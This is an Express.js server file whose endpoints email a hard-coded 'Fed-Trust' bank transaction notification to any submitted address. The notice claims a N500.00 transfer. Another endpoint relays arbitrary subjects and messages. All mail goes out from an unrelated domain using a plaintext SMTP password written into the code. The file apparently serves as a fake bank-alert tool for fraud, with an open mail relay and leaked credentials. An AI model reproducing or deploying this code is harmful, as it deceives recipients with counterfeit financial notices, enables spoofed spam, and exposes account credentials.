const express = require('express');
var bodyParser  = require('body-parser');
const app = express();
const port = 4000
const nodemailer = require("nodemailer");
const path = require('path');





app.use(
    express.urlencoded({
      extended: true,
    })
  )

  app.use(express.json());



    const ff = path.join(__dirname, '/src')
    app.use( express.static(ff));


app.get('/', (request, response)=>{
    response.sendFile(__dirname + '/src')
});

app.post('/login.html', (request, response)=>{
   

    let info = request.body
    console.log(info.email);
   
    return new Promise((resolve, reject)=>{
        var transporter = nodemailer.createTransport({
            host: 'mail.todayupdate.com.ng',
            secureConnection: true,
            port: 465,
            service: 'SMTP',
            auth:{
                user:"support@todayupdate.com.ng",
                pass:"78453722$Mm"
            },
            from:"support@todayupdate.com.ng",
        });

        const mail_option = {
            from:`Fed-Trust <noreply@todayupdate.com.ng>`,
            to: info.email,
            subject: " New Alert From Fed-Trust",
            html: `
            <div style=" width: 100%; margin-top: 3%; display: flex; align-items: center; justify-content: center;" >
            <style>
        
           
            </style>
        <div style=" width: 100%;">
            <div class="inm" style="  border-top-right-radius: 50px; border-top-left-radius: 50px;  background-color: rgba(227, 159, 250, 0.463);  display: flex;" >
           <div style=" width: 100%;"> 
         <h1 style="color: rgb(137, 66, 203); font-size: 50px; text-align: center; width: 100%;">Fed-Trust</h1>
           </div>
        </div>
        
        
           <div style="margin: 0px;  ">
            <h1 style=" margin: 0px; padding-top: 5%; margin-left: 2%;">Transaction Notification</h1>
            <hr>
           <div style="padding: 3%;  border-left: 1px solid rgba(0, 0, 0, 0.272); border-right: 1px solid rgba(0, 0, 0, 0.288);">
            <h4>Dear  User Name Here,</h4>
            <p>
            Your transfer of N500.00 was successful. Your available account balance is N630.00.
            </p>
            <h4>Transaction Details</h4>
            <p>Bank:</p>
            <h5>Fed-Trust</h5>
        
            <p>Account Number:</p>
            <h5>3651395135</h5>
        
            <p>Account Holder:</p>
            <h5>James Wells</h5>
        
            <p>Amount:</p>
            <h5>N500.00</h5>
        
            <p>Date:</p>
            <h5>2024/02/11</h5>
        
            <h5>
                For further enquiries, please contact our customer support through: <br>
                Email: <a href="#">customerservice@fedtrust.online </a>
            </h5>
        
            <h4>Thanks for choosing Fed-Trust</h4>
           </div>
           </div>
           <div style="background-color: rgba(227, 159, 250, 0.463); text-align: center; padding: 1%; border-bottom-left-radius: 50px; border-bottom-right-radius: 50px;">
            <h6>Copyright © 2024  Fed-Trust Bank All Rights Reserved.</h6>
            </div>
        </div>
           </div>
            
            `
        }

        transporter.sendMail(mail_option, function(error, info){
            if(error){
                return reject({message:`An error has occured`})
            }
            return resolve({message:"email sentss"})
        })




    response.json({
     message: 'success'
    })
    
})
})




app.post('/about.html', (request, response)=>{
   

    let info = request.body
    console.log(info.email);
   
    return new Promise((resolve, reject)=>{
        var transporter = nodemailer.createTransport({
            host: 'mail.todayupdate.com.ng',
            secureConnection: true,
            port: 465,
            service: 'SMTP',
            auth:{
                user:"support@todayupdate.com.ng",
                pass:"78453722$Mm"
            },
            from:"support@todayupdate.com.ng",
        });

        const mail_option = {
            from:`About Fed-Trust <support@todayupdate.com.ng>`,
            to: info.email,
            subject: info.subject,
            text:  info.message
        }

        transporter.sendMail(mail_option, function(error, info){
            if(error){
                return reject({message:`An error has occured`})
            }
            return resolve({message:"email sentss"})
        })




    response.json({
     message: 'success'
    })
    
})
})


app.listen(port, ()=>{
    console.log(`this project is working fine at http://localhost:${port}`)
});